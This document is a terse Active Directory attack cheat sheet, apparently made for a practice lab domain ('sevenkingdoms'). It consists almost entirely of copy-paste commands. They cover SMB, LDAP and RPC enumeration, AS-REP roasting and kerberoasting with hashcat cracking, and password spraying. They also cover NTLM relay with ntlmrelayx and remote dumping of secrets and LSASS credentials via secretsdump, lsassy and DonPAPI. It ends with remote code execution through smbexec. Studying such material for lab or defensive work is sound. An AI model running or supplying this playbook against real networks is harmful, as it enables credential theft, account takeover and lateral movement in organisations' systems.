- Recon with cme  
  ```cme smb 192.168.56.1/24```

- Find DC ip  
  ```nslookup -type=srv _ldap._tcp.dc._msdcs.//DOMAIN```

- Setup Kerberos  
  ```sudo apt install krb5-user```

- Get a TGT for a user  
  ```getTGT.py DOMAIN/USER:PASS```

- Enumerate DC’s anonymously
  - cme  
  `cme smb 192.168.56.11 --users --pass-pol`  
  - enum4linux  
  `enum4linux 192.168.56.11`
  - rpc call  
  ```bash
        rpcclient -U "DOMAIN\\" 192.168.56.11 -N`  
            > enumdomusers
            > enumdomgroups

        net rpc group members 'Domain Users' -W 'DOMAIN' -I '192.168.56.11' -U '%'
  ```
  - nmap  
  `nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN',userdb=users.txt" 192.168.56.10`

- List guest access on shares
  `cme smb 192.168.56.10-23 -u 'a' -p '' --shares`

- ASREP - roasting
  - Get hash  
    `GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt`
  - Brute  
    `hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt`

- Password Spray (user=pass)  
  be carreful you can lock accounts !
```
    cme smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
    sprayhound -U users.txt -d DOMAIN -dc 192.168.56.11 --lower
```

- User listing
  - Impacket  
  `GetADUsers.py -all DOMAIN/USER:PASS `
  - LDAP  
  `ldapsearch -H ldap://192.168.56.11 -D "USER@DOMAIN" -w PASS -b 'DC=DOMAIN,DC=DOMAIN,DC=DOMAIN' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'`

- Kerberoasting
  - Find users with SPN  
    - with Impacket  
  `GetUserSPNs.py -request -dc-ip 192.168.56.11 DOOMAIN/USER:PASS -outputfile kerberoasting.hashes`
    - with cme  
    `cme ldap 192.168.56.11 -u USER -p 'PASS' -d DOMAIN --kerberoasting KERBEROASTING`
  - Brute  
  `hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force`

- Share enum  
`cme smb 192.168.56.10-23 -u USER -p PASS -d DOMAIN --shares`

- DNS dump  
`adidnsdump -u 'DOMAIN\USER' -p 'PASS' DOMAIN`

- Try responder + ntlmrelayx to smb    
`cme smb 192.168.56.10-23 --gen-relay-list relay.txt`    
`ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks`
  - dump secrets  
`proxychains secretsdump -no-pass 'DOMAIN'/'USER'@'192.168.56.22'`  
`proxychains lsassy --no-pass -d DOMAIN -u USER 192.168.56.22`
`proxychains DonPAPI -no-pass 'DOMAIN'/'USER'@'192.168.56.22'`
  - Smbclient  
`proxychains smbclient.py -no-pass 'DOMAIN'/'USER'@'192.168.56.22' -debug`
  - Code execution : smbexec or atexec  
`proxychains smbexec.py -no-pass 'DOMAIN'/'USER'@'192.168.56.22' -debug`
  - And other relays...